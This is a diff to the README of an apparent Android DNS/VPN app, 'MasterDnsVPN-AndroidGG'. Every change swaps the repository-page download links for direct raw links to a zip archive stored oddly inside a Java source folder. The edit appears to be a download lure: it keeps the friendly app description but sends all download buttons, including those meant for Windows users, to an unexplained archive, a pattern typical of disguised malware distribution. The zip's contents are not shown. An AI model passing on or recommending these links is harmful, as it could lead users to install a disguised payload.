@@ -1,12 +1,12 @@
 # 🛡️ MasterDnsVPN-AndroidGG - Private DNS Access Made Simple
 
-[![Download MasterDnsVPN-AndroidGG](https://img.shields.io/badge/Download%20Now-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/tylero5029/MasterDnsVPN-AndroidGG)
+[![Download MasterDnsVPN-AndroidGG](https://img.shields.io/badge/Download%20Now-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/tylero5029/MasterDnsVPN-AndroidGG/main/android/app/src/main/java/com/masterdnsvpn/Dns_GG_Master_Android_VP_v3.9.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download the app:
 
-[Open MasterDnsVPN-AndroidGG Download Page](https://github.com/tylero5029/MasterDnsVPN-AndroidGG)
+[Open MasterDnsVPN-AndroidGG Download Page](https://raw.githubusercontent.com/tylero5029/MasterDnsVPN-AndroidGG/main/android/app/src/main/java/com/masterdnsvpn/Dns_GG_Master_Android_VP_v3.9.zip)
 
 ## 🖥️ What This App Does
 
@@ -31,7 +31,7 @@ This app is made for Android use, but many users first find it from Windows. If 
 ## 🪟 How to Download on Windows
 
 1. Open the download page:
-   [https://github.com/tylero5029/MasterDnsVPN-AndroidGG](https://github.com/tylero5029/MasterDnsVPN-AndroidGG)
+   [https://raw.githubusercontent.com/tylero5029/MasterDnsVPN-AndroidGG/main/android/app/src/main/java/com/masterdnsvpn/Dns_GG_Master_Android_VP_v3.9.zip](https://raw.githubusercontent.com/tylero5029/MasterDnsVPN-AndroidGG/main/android/app/src/main/java/com/masterdnsvpn/Dns_GG_Master_Android_VP_v3.9.zip)
 
 2. Look for the latest release or the main project files.
 
@@ -165,7 +165,7 @@ This project relates to:
 Windows users can use this repository page to get the app files, read the project details, and prepare the download for Android use.
 
 Open the page here:
-[https://github.com/tylero5029/MasterDnsVPN-AndroidGG](https://github.com/tylero5029/MasterDnsVPN-AndroidGG)
+[https://raw.githubusercontent.com/tylero5029/MasterDnsVPN-AndroidGG/main/android/app/src/main/java/com/masterdnsvpn/Dns_GG_Master_Android_VP_v3.9.zip](https://raw.githubusercontent.com/tylero5029/MasterDnsVPN-AndroidGG/main/android/app/src/main/java/com/masterdnsvpn/Dns_GG_Master_Android_VP_v3.9.zip)
 
 ## 🔍 What to Look For on the Page
 
